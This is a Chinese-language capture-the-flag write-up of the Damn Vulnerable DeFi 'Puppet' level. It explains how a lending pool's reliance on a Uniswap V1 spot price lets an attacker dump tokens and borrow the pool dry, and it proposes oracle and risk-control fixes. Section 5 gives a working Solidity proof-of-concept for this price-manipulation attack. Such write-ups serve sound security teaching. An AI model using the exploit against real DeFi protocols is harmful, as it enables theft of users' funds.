# Puppet 漏洞分析

## 1. 合约功能概述

`PuppetPool` 是一个 DVT 借贷池，用户需要先抵押 ETH 才能借出 DVT。

**核心组件：**
- **PuppetPool.sol**: 借贷池，使用 Uniswap V1 池子余额作为价格来源
- **UniswapV1Exchange**: DVT/ETH 交易对，提供现货价格
- **Puppet.t.sol**: 关卡测试，要求单交易清空借贷池并转入 `recovery`

**业务流程：**
1. 计算借款 `amount` 所需抵押：`deposit = amount * price * 2`
2. `price` 直接由 Uniswap V1 池子当前 `ETH / DVT` 余额比计算
3. 用户支付足额 ETH 后，借贷池转出 DVT

---

## 2. 漏洞位置

### 漏洞代码（PuppetPool.sol）

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    // 按“当前价格”计算抵押，不做平滑/延迟/多源校验
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}

function _computeOraclePrice() private view returns (uint256) {
    // ⚠️ 直接读取 Uniswap V1 池子现货余额比 = ETH / DVT
    // 攻击者只要在同池子内交易，就能立刻改变这个值
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

### 漏洞本质

- 价格源是**单一 AMM 的即时现货价**，可被同交易大额 swap 直接操纵。
- 借贷池将该价格直接用于抵押计算，导致抵押要求可被攻击者主动压低。

---

## 3. 漏洞原理分析

### 3.1 为什么可以“先砸价再借空”

初始流动性很浅（10 ETH / 10 DVT），玩家却持有 1000 DVT。

当攻击者把大量 DVT 卖入 Uniswap：
- 池子 DVT 储备大幅上升
- 池子 ETH 储备大幅下降
- `ETH/DVT` 价格被压到极低

于是借贷池认为 DVT 很便宜，`calculateDepositRequired()` 急剧下降。

### 3.2 关卡里的利用路径

1. 用玩家 DVT 在 Uniswap V1 执行 `tokenToEthSwapInput`，压低 DVT 价格
2. 查询借空池子所需抵押 `depositRequired`
3. 用攻击者合约持有的 ETH 抵押，借走池子全部 DVT 到 `recovery`

### 3.3 单交易约束如何满足

测试中有约束：
```solidity
assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
```

解法通过“玩家仅部署一次攻击合约”，并在同一调用链内完成全部操作，满足 nonce 限制。

---

## 4. 修复方案

### 方案一：改用抗操纵预言机（推荐）

- 使用 Chainlink 等外部去中心化预言机
- 或至少使用 Uniswap TWAP（非 spot）并设置足够窗口

### 方案二：增加借贷风控

- 抵押率缓冲（更高初始系数）
- 每区块借款上限 / 全局借款上限
- 价格变化速率限制（circuit breaker）

### 方案三：多源价格聚合

- 同时读取多个市场与预言机，采用中位数/截尾均值
- 当源间偏差过大时拒绝借款

---

## 5. Proof of Concept（关键代码）

```solidity
function attack() external {
    uint256 attackerTokenBalance = token.balanceOf(address(this));

    // 1) 大量抛售 DVT，压低 Uniswap 里的 DVT 价格
    token.approve(address(uniswapV1Exchange), attackerTokenBalance);
    uniswapV1Exchange.tokenToEthSwapInput(attackerTokenBalance, 1, block.timestamp);

    // 2) 价格被压低后，借空池子所需抵押显著下降
    uint256 borrowAmount = token.balanceOf(address(lendingPool));
    uint256 depositRequired = lendingPool.calculateDepositRequired(borrowAmount);

    // 3) 低抵押借走全部 DVT，直接发给 recovery
    lendingPool.borrow{value: depositRequired}(borrowAmount, recovery);
}
```

---

## 6. 总结

`Puppet` 的根因是：**把可被即时操纵的 AMM 现货价当作借贷预言机**。

攻击者并不需要复杂权限，只需利用“流动性浅 + 持仓大”就能先制造价格，再利用该价格借空池子。
